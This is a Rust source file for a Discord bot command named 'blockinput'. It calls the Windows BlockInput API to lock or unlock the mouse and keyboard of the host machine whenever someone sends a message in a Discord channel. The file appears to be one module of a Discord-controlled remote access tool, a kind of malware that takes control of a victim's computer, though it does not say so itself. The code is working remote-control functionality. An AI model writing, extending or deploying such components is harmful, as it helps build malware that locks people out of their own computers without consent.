use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;

use winapi::um::winuser::BlockInput;

pub struct BlockInputCommand;

#[async_trait]
impl BotCommand for BlockInputCommand {
    fn name(&self) -> &str { "blockinput" }
    fn description(&self) -> &str { "Block or unblock mouse and keyboard input" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".blockinput <on|off>" }
    fn examples(&self) -> &'static [&'static str] {
        &[
            ".blockinput on",
            ".blockinput off",
        ]
    }
    fn aliases(&self) -> &'static [&'static str] { &["block"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(a) => a.to_lowercase(),
            None => {
                http.create_message(msg.channel_id)
                    .content("**Usage**: `.blockinput <on|off>`")
                    .await?;
                return Ok(());
            }
        };

        let enable = match action.as_str() {
            "on" | "enable" | "block" => true,
            "off" | "disable" | "unblock" => false,
            _ => {
                http.create_message(msg.channel_id)
                    .content("**Error**: Action must be `on` or `off`")
                    .await?;
                return Ok(());
            }
        };

        unsafe {
            let result = BlockInput(if enable { 1 } else { 0 });

            if result != 0 {
                let status = if enable { "blocked" } else { "unblocked" };
                http.create_message(msg.channel_id)
                    .content(&format!("Successfully {} mouse and keyboard input", status))
                    .await?;
            } else {
                http.create_message(msg.channel_id)
                    .content("Failed to change input blocking state. This command requires administrator privileges.")
                    .await?;
            }
        }

        Ok(())
    }
}
